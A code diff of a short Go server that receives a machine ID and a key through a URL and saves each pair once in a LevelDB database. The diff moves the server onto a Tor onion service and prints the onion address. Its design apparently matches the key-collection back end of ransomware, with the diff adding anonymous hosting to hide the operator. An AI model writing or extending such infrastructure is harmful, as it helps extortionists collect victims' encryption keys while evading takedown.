@@ -3,12 +3,15 @@ package main
 import (
     "log"
     "net/http"
+    "context"
+    "time"
     "github.com/gorilla/mux"
     "github.com/syndtr/goleveldb/leveldb"
+    "github.com/cretz/bine/tor"
 )
 
 const (
-    db_filepath = ""
+    db_filepath = "TEMP"
 )
 
 func main() {
@@ -23,12 +26,30 @@ func main() {
         params := mux.Vars(r)
         machineid := params["machineid"]
         key := params["key"]
-        if _, err := db.Get([]byte(machineid), nil); err != nil {
+        if data, err := db.Get([]byte(machineid), nil); err != nil {
             db.Put([]byte(machineid), []byte(key), nil)
         } else {
+            log.Printf("key already exists: %s\n", data)
             return
         }
     }).Methods("GET")
 
-    http.ListenAndServe(":8081", r)
+    t, err := tor.Start(nil, nil)
+    if err != nil {
+        log.Fatal(err)
+    }
+    defer t.Close()
+
+    ctx, cancel := context.WithTimeout(context.Background(), 3 * time.Minute)
+    defer cancel()
+
+    onion, err := t.Listen(ctx, &tor.ListenConf{RemotePorts: []int{80}})
+    if err != nil {
+        log.Fatalln(err)
+    }
+    defer onion.Close()
+
+    log.Printf("onion url: http://%v\n", onion.ID)
+
+    http.Serve(onion, r)
 }
